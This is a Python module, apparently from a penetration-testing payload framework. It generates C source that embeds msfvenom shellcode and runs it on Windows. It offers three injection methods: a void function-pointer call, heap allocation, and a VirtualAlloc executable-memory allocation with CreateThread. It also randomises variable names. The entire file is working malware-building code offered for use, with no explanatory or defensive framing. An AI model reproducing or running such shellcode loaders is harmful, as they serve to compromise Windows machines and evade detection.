"""

C version of the VirtualAlloc pattern invoker.

Code adapted from:
http://www.debasish.in/2012/08/experiment-with-run-time.html


module by @christruncer

"""

from modules.common import shellcode
from modules.common import helpers

class Payload:

    def __init__(self):
        # required options
        self.description = "C Combination of all Injection Methods w/no Obfuscation"
        self.language = "c"
        self.rating = "Poor"
        self.extension = "c"

        self.shellcode = shellcode.Shellcode()
        # options we require user ineraction for- format is {OPTION : [Value, Description]]}
        self.required_options = {
                                    "COMPILE_TO_EXE" : ["Y", "Compile to an executable"],
                                    "INJECT_METHOD"  : ["Virtual", "Void, Virtual, or Heap"]
                                }

    def generate(self):

        # Generate Shellcode Using msfvenom
        Shellcode = self.shellcode.generate(self.required_options)

        # Generate Random Variable Names
        RandShellcode = helpers.randomString()
        RandReverseShell = helpers.randomString()
        RandMemoryShell = helpers.randomString()

        if self.required_options["INJECT_METHOD"][0].lower() == "void":

            # Start creating our void pointer C payload
            PayloadCode = 'unsigned char payload[]=\n'
            PayloadCode += '\"' + Shellcode + '\";\n'
            PayloadCode += 'int main(void) { ((void (*)())payload)();}\n'

            return PayloadCode

        elif self.required_options["INJECT_METHOD"][0].lower() == "heap":

            # Create out heap injecting C payload
            PayloadCode = '#include <windows.h>\n'
            PayloadCode += '#include <stdio.h>\n'
            PayloadCode += '#include <string.h>\n'
            PayloadCode += 'int main()\n'
            PayloadCode += '{\n'
            PayloadCode += '    HANDLE heapVar;\n'
            PayloadCode += '    LPVOID lpvAddr;\n'
            PayloadCode += '    HANDLE hHand;\n'
            PayloadCode += '    DWORD dwWaitResult;\n'
            PayloadCode += '    DWORD threadID;\n\n'
            PayloadCode += 'unsigned char buff[] = \n'
            PayloadCode += '\"' + Shellcode + '\";\n\n'
            PayloadCode += 'heapVar = HeapCreate(0x00040000, strlen(buff), 0);\n'
            PayloadCode += 'lpvAddr = HeapAlloc(heapVar, 0x00000008, strlen(buff));\n'
            PayloadCode += 'RtlMoveMemory(lpvAddr,buff, strlen(buff));\n'
            PayloadCode += 'hHand = CreateThread(NULL,0,lpvAddr,NULL,0,&threadID);\n'
            PayloadCode += 'dwWaitResult = WaitForSingleObject(hHand,INFINITE);\n'
            PayloadCode += 'return 0;\n'
            PayloadCode += '}\n'

            return PayloadCode

        else:

            # Start creating our virtual alloc injecting C payload
            PayloadCode = '#include <windows.h>\n'
            PayloadCode += '#include <stdio.h>\n'
            PayloadCode += '#include <string.h>\n'
            PayloadCode += 'int main()\n'
            PayloadCode += '{\n'
            PayloadCode += '    LPVOID lpvAddr;\n'
            PayloadCode += '    HANDLE hHand;\n'
            PayloadCode += '    DWORD dwWaitResult;\n'
            PayloadCode += '    DWORD threadID;\n\n'
            PayloadCode += 'unsigned char buff[] = \n'
            PayloadCode += '\"' + Shellcode + '\";\n\n'
            PayloadCode += 'lpvAddr = VirtualAlloc(NULL, strlen(buff),0x3000,0x40);\n'
            PayloadCode += 'RtlMoveMemory(lpvAddr,buff, strlen(buff));\n'
            PayloadCode += 'hHand = CreateThread(NULL,0,lpvAddr,NULL,0,&threadID);\n'
            PayloadCode += 'dwWaitResult = WaitForSingleObject(hHand,INFINITE);\n'
            PayloadCode += 'return 0;\n'
            PayloadCode += '}\n'

            return PayloadCode
